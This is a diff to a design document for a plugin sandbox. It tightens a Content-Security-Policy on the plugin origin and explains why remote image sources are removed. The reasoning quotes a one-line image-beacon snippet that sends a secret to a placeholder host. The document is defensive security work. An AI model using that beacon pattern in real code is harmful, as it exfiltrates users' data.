@@ -27,15 +27,20 @@ review produces false negatives (Figma's own conclusion after a sandbox-escape b
 - Locked down by a strict **Content-Security-Policy** on the plugin origin:
   ```
   default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
-  img-src 'self' data: https://media.doot.games;
-  connect-src 'none';                      # no fetch/XHR/WebSocket - no exfiltration, no mining payloads
+  img-src 'self' data:;                     # NOT a remote host - see below
+  connect-src 'none';                      # no fetch/XHR/WebSocket
   frame-ancestors https://doot.games;      # only Doot may embed it
   base-uri 'none'; form-action 'none';
   ```
-  `connect-src 'none'` is the single most important control: a malicious plugin
-  **cannot phone home or exfiltrate the room**. A plugin that needs an asset host
-  declares `allowedConnectSrc` in its manifest (default empty; a wider allowlist is
-  a privilege granted only to reviewed/featured plugins).
+  `connect-src 'none'` blocks fetch/XHR/WebSocket, but it is **not** "cannot
+  exfiltrate" on its own: **any allowed remote `img-src` is a beacon channel**
+  (`new Image().src = 'https://host/?d=' + secret`). So `img-src` is `'self'` +
+  `data:` only — platform media is handed to the plugin **over the bridge**, never as
+  a fetchable URL the plugin builds. A reviewed/featured plugin that genuinely needs
+  an asset host may be granted a narrow `allowedConnectSrc`/`img-src` (default empty).
+  Also note: the plugin **bundle** must be re-hosted **same-origin** on the plugin
+  origin so `script-src 'self'` actually covers it — `script-src` is never widened to
+  a CDN (a CDN script URL would re-open the exfil/mining surface).
 
 ## The bridge (a tiny, validated MessageChannel protocol)
 
